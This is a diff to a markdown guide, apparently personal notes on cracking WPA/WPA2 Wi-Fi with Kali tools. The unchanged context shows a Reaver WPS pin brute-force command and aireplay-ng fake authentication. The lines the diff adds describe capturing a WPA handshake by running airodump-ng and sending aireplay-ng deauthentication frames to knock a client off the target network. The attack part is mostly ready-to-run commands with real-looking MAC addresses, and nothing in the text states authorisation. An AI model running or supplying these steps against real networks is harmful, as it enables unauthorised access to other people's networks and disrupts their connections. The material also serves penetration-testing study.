@@ -48,6 +48,7 @@ aircrack-ng test.cap
 
 ## Steps for WPA/WPA2
 
+**Works for some routers with WPS**
 - Changing the wireless USB mode to monitoring
 ```bash
 ifconfig wlan0 down
@@ -66,7 +67,23 @@ aireplay-ng --fakeauth 30 -a 78:67:0E:31:4C:42 -h 3A:97:5F:E2:18:5F wlan0
 ```bash
 reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associate
 ```
+
 - If Reaver finds the pin then the password will be available for the Wifi network. 
 (not all routers will be cracked with these steps)
+
+**Method for capturing handshake**
+
+- Find the BSSID of the network with ifconfig
+- Write a file via airodump-ng
+```bash
+root@kali:~# airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_handshake wlan0 
+```
+- Disconnect the client from the target network to capture the handshake.
+```bash
+aireplay-ng --deauth 4 -a 30:DE:4B:AD:CC:8A -c EE:7B:BE:70:D6:1F wlan0
+```
+- The handshake WPA will be saved in the file we created wpa_handshake.cap
+- 
+
 
 ￼
